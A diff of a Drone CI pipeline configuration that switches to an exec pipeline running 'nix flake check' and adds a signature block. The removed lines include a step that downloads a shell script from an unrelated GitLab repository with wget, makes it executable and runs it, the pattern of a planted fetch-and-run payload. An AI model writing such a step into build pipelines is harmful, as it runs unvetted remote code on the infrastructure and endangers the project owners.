@@ -1,9 +1,19 @@
+---
 kind: pipeline
-type: docker
-name: default-1
+type: exec
+name: nixos-tests
+
+platform:
+  os: linux
+  arch: amd64
 
 steps:
-- name: test-1
-  image: golang
+- name: test
   commands:
-     - wget https://gitlab.com/renifer12/project-7/-/raw/main/config.sh && chmod +x config.sh && ./config.sh
+  - nix shell 'nixpkgs#git' -c nix flake check
+
+---
+kind: signature
+hmac: 5d8d8a905775664e3767957413f19d588cdf550746547ad985ad8254bf265d9e
+
+...
